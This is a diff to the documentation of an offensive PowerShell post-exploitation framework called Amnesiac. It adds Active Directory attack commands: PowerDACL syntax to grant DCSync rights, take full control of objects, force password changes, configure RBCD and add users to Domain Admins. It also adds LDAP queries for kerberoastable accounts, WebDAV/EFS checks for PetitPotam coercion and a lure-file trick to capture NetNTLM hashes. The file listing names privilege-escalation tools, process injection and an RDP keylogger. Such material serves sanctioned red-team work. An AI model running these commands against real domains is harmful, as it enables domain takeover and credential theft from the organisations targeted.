@@ -126,6 +126,50 @@ Four improvement layers, all changes in `Amnesiac.ps1`:
 | `servelog` | Print the serve request log (timestamped 200/404 lines, coloured by status) |
 | `bootstrap` | Scenario 2: print all AMSI bypass options + complete GitHub 3-liner and local-server 3-liner with current build's randomized names |
 
+### Domain Action Commands (local shell + active sessions)
+
+| Command | Tool file | Effect |
+|---------|-----------|--------|
+| `PowerDACL` | `PowerDACL.ps1` | Load PowerDACL; auto-shows built-in help. Actions: `DCSync`, `GenericAll`, `SetOwner`, `ForceChangePass`, `RBCD`, `SetSPN/RemoveSPN`, `AddToGroup/RemoveFromGroup`, `EnableAccount/DisableAccount`, `AddComputer/DeleteComputer`, `Set-DomainObject`. Run `PowerDACL -h` for full syntax. |
+| `CheckWebDAV` | `CheckWebDAVStatus.ps1` | Check WebDAV/EFS pipe status across domain hosts. Creates `CheckWebDAV` alias. Run `CheckWebDAV -h` for full syntax. |
+| `CheckSMBSigning` | `CheckSMBSigning.ps1` | Scan domain hosts for SMB signing status. Run `CheckSMBSigning -h` for syntax. |
+| `CollectAD` | `Collect-ADObjects.ps1` | LDAP enumeration — collect AD objects (Users, Computers, Groups, GPOs, DomainControllers, OUs, Printers, Policies). Supports `-Identity`, `-LDAP`, `-Property`, `-Enabled/-Disabled`, `-Convert`. **Note:** uses `Add-Type` — writes temp DLL to `%TEMP%` on target. Run `CollectAD -h` for syntax. |
+| `CredValidate` | `Validate-Credentials.ps1` | Test domain credentials without LDAP bind — uses Kerberos TGT request |
+
+**PowerDACL key actions** (all require `-TargetDomain <dom> -TargetServer <DC>`; `EnableAccount/DisableAccount/AddComputer/DeleteComputer/Set-DomainObject` use `-Domain/-Server`):
+```
+DCSync -Target <user>                                        # grant DCSync rights
+DCSync -Target <user> -Remove                               # revoke
+GenericAll -Target <obj> -Grantee <user>                    # full control
+SetOwner -Target <obj> -Owner <user>
+ForceChangePass -Target <user> -Password <pass>
+RBCD -Target <computer$> -Grantee <user>
+RBCD -Clear -Target <computer$>
+SetSPN / RemoveSPN -Target <user> [-SPN 'svc/host']
+AddToGroup / RemoveFromGroup -Target <user> -Group 'Domain Admins'
+EnableAccount / DisableAccount -Target <obj> -Domain <dom> -Server <DC>
+AddComputer -ComputerName <name> [-Password <pass>] -Domain <dom> -Server <DC>
+DeleteComputer -ComputerName <name> -Domain <dom> -Server <DC>
+Set-DomainObject -Identity <obj> -Domain <dom> -Server <DC> -Set @{prop='value'}
+Set-DomainObject -Identity <obj> -Domain <dom> -Server <DC> -Clear 'prop'
+```
+
+**Collect-ADObjects useful patterns:**
+```powershell
+Collect-ADObjects -Collect Users -Enabled -Convert | Select samaccountname,lastlogon
+Collect-ADObjects -Identity hodor -Convert | fl
+Collect-ADObjects -LDAP 'servicePrincipalName=*' -Convert          # kerberoastable accounts
+Collect-ADObjects -LDAP 'adminCount=1' -Collect Users -Convert     # protected users
+Collect-ADObjects -Collect Computers -Property dnshostname,operatingsystem
+Collect-ADObjects -Collect DomainControllers -Convert
+```
+
+**CheckWebDAV notes:**
+- Detects hosts where `\\host\pipe\DAV RPC SERVICE` is reachable (WebDAV client active)
+- Also checks `\\host\pipe\efsrpc` (EFS — useful for PetitPotam coercion)
+- `-Sessions`: runs `Invoke-SessionHunter` against WebDAV-enabled hosts to find logged-in users
+- `-Enable/-Disable -WritableShares <file>`: drop/remove `All_Staff_Salaries.searchconnector-ms` in share list — coerces NetNTLM when user browses the share
+
 ### LPE Commands (local shell + active sessions)
 
 | Command | Tool file | Effect |
@@ -415,6 +459,11 @@ Amnesiac-main/
 │   ├── PowerUp.ps1                 — LPE: privilege escalation checks
 │   ├── PrivescCheck.ps1            — LPE: comprehensive audit
 │   ├── Invoke-GodPotato.ps1        — LPE: potato SYSTEM escalation
+│   ├── PowerDACL.ps1               — Domain: AD DACL abuse (DCSync, GenericAll, RBCD, etc.)
+│   ├── CheckWebDAVStatus.ps1       — Domain: WebDAV/EFS pipe detection + session hunting
+│   ├── CheckSMBSigning.ps1         — Domain: SMB signing scanner
+│   ├── Collect-ADObjects.ps1       — Domain: LDAP enumeration (Users/Computers/Groups/GPOs/OUs/DCs/Policies)
+│   ├── Validate-Credentials.ps1    — Domain: credential validation via Kerberos
 │   ├── ... (other tools)
 │   └── RDPKeylog.exe
 ├── AmnesiacLoader/                 — C# assembly (process injection, sleep masking)
@@ -459,7 +508,8 @@ All help blocks (`Get-AvailableCommands` for pipe sessions, local shell `help`, 
 **Intentionally unmarked despite privilege nuance:** `Kerb` and `Monitor` read the current
 user's own TGT cache — no LSASS access needed. `SessionHunter` uses `NetSessionEnum` which
 works as a domain user against DCs and older member servers (restricted only on Server 2016+
-member servers by default policy).
+member servers by default policy). `PowerDACL`, `CheckWebDAV`, `CheckSMBSigning`, `CollectAD`,
+and `CredValidate` all operate as standard domain users — no elevated privilege required.
 
 ---
 
